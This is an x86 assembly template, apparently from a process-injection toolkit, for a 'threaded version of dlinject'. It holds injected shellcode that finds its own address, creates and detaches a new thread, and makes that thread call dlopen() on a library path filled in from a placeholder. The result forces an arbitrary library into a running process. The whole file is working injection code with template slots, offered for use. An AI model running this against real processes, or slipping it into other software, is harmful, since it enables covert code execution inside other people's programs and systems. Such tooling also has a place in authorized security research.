# Threaded veesion of dlinject.s
# Same caveats as execute_precompiled_threaded.s

[FRAGMENT:asminject_libc_or_libdl_dlopen.s:FRAGMENT]
[FRAGMENT:asminject_libpthread_pthread_create.s:FRAGMENT]
[FRAGMENT:asminject_libpthread_pthread_detach.s:FRAGMENT]
[FRAGMENT:asminject_libpthread_pthread_exit.s:FRAGMENT]
	// set EDX to the address of the inlined load_library function
	call asminject_libdl_dlopen_load_library_function_get_next
asminject_libdl_dlopen_load_library_function_get_next:
	pop edx
	add edx, 6
	jmp post_load_library

load_library:
	// BEGIN: call dlopen() against the specified library
	# set EDI to the address of the library path string
	call asminject_libdl_dlopen_library_path_get_next
asminject_libdl_dlopen_library_path_get_next:
	pop edi
	add edi, 6
	jmp asminject_libdl_dlopen_call_dlopen

library_path:
	.ascii "[VARIABLE:librarypath:VARIABLE]\0"

asminject_libdl_dlopen_call_dlopen:

    call asminject_libc_or_libdl_dlopen
	mov edi, 0
	call asminject_libpthread_pthread_exit
	// END: call dlopen()

post_load_library:
	# edx should already point to the function at this point
	mov edi, [VARIABLE:ARBITRARY_READ_WRITE_DATA_ADDRESS:VARIABLE]
	add edi, 0x1000		# don't overwrite anything important
	push edx
	push edi
	call asminject_libpthread_pthread_create
	pop edi
	pop edx
// detach the newly-created thread where the library has been loaded
	call asminject_libpthread_pthread_detach
	
[VARIABLE:POST_SHELLCODE_LABEL:VARIABLE]:
	
# inlined shellcode will go after this delimiter
SHELLCODE_SECTION_DELIMITER
